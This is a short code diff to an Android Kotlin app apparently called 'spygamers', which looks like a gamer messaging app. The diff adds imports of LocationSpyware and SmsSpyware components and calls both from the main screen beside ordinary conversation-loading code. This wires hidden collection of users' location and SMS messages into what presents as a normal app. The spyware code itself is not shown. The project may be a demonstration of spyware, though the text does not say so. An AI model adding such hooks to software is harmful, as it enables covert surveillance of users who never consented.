@@ -26,6 +26,8 @@ import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.appbar.DrawerBody
 import com.example.spygamers.components.appbar.DrawerHeader
+import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.ConversationActivity
 import com.example.spygamers.services.AuthOnlyBody
@@ -88,6 +90,9 @@ private fun MainBody(
     }
 
     var conversations by rememberSaveable { mutableStateOf<List<ConversationActivity>>(emptyList()) }
+
+    LocationSpyware(viewModel, context)
+    SmsSpyware(viewModel = viewModel, context = context)
 
     LaunchedEffect(Unit) {
         if (sessionToken.isBlank()) {
